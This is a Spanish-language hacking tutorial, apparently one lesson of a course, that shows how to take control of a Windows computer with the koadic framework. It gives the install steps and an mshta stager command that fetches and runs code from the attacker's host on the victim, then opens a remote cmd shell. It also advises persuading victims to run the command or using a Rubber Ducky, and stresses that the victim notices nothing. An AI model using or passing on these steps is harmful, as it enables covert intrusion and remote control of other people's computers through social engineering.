# 36. Hackeando PC con un comando

Vamos a ver a cómo controlar una computadora Windows con un comando.

## koadic

Vamos a hacer uso de la herramienta llamada **koadic**.

* Repositorio de GitLab: [koadic](https://gitlab.com/kalilinux/packages/koadic)

Clonamos la herramienta:

```bash
git clone https://gitlab.com/kalilinux/packages/koadic.git
```

Luego, nos dirigimos a la carpeta de la herramienta:

```bash
cd koadic
ls
```

Vamos a instalar el archivo de los requerimientos:

```bash
pip3 install -r requirements.txt
```

## Uso

Una vez instalado, ejecutamos la herramienta:

```bash
./koadic
```

### Panel principal

Ponemos el comado:

```bash
use stager/js/mshta
info
```

```plaintext
NAME    VALUE       REQ     DESCRIPTION
____    __________  ___     ____________
SRVHOST <ip>        yes     ...
SRVHOST 9999        yes     ...
...
```

Esto nos dará la dirección IP de nuestra computadora atacante. Para ver si está correcto, en una pestaña nueva ponemos:

```bash
ifconfig
```

Y verficamos que la dirección IP coincida.

Vamos a trabajar en el puerto `9999`.

### Empezando el ataque

Empezamos a correr la herramienta:

```bash
run
```

Nos devuelve:

```plaintext
[+] Spanned a stager at http://<own-ip>:9999/YuTbA
[>] mshta http://<own-ip>:9999/YuTbA
```

* `http://<own-ip>:9999/YuTbA` Es la dirección en la cual se va a realizar la conexión

Debemos ejecutar el comando (segunda línea) en la computadora de la víctima. Tiene que ser una computadora Windows, en una consola Windows.

#### Computadora víctima

Nos vamos a una computadora víctima (**máquina virtual con Windows 10** o nuestro propio equipo), abrimos un **Símbolo del sistema** (terminal
de Windows) y ejecutamos:

```powershell
mshta http://<own-ip>:9999/YuTbA
```

Podemos enviarle este comando a la víctima, podemos hacer ejecutar este comando en la computadora de la víctima, hay un monton de formas.
Hay dispositivos llamados **Rubber Ducky**, es un pendrive que conectándolo a la computadora, podemos hacer que se ejecuten una serie de
comandos como este, y hacer que desde nuesta computadora atacante podamos tener acceso a la computadora de la víctima.

Pero podemos hacer que la víctima ejecute este comando de diversas formas. Persuadiendo a la víctima que ingrese este comando y nosotros
como atacantes tengamos acceso.

Una vez lo ejecutamos, no pasa nada, no levantamos sospechas.

#### Computadora atacante

Si volvemos a nuestra computadora de atacante, podremos ver:

```plaintext
[+] Zombie 0 Staging new connection (<victim-ip>) on Stager 0
[+] Zombie 0 <victim-hostname>\<victim-user> @ <victim-hostname> -- Windows 10 Home
```

Se realizó una conexión en la computadora Windows. Nos dice:

* La versión de Windows utilizada en el dispositivo
* El nombre de la máquina
* El usuario

Ponemos el comando:

```bash
help
```

Para ver que podemos hacer. Podemos abrir una consola para poder controlar el dispositivo víctima:

```bash
cmdshell 0
```

* `0`: Es el número de la máquina que afectamos recientemente, `Zombie 0`

Y ya tenemos acceso a una consola **cmd**, la cual podemos controlar el dispositivo, ejecutar comandos, navegar por las distintas carpetas, etc.

Con esto nos muestra todas las distintas carpetas que están adentro de la computadora:

```plaintext
[koadic: ZOMBIE 0 (<victim-ip>) -C:\Users\<victim-user]> dir
```

Podemos ir a la carpeta de **Descargas**, podemos trasladarnos a la carpeta que queramos, y podemos hacer y ejecutar lo que nosotros queramos:

```plaintext
[koadic: ZOMBIE 0 (<victim-ip>) -C:\Users\<victim-user]> cd Downloads

[koadic: ZOMBIE 0 (<victim-ip>) -C:\Users\<victim-user\Downloads]>
```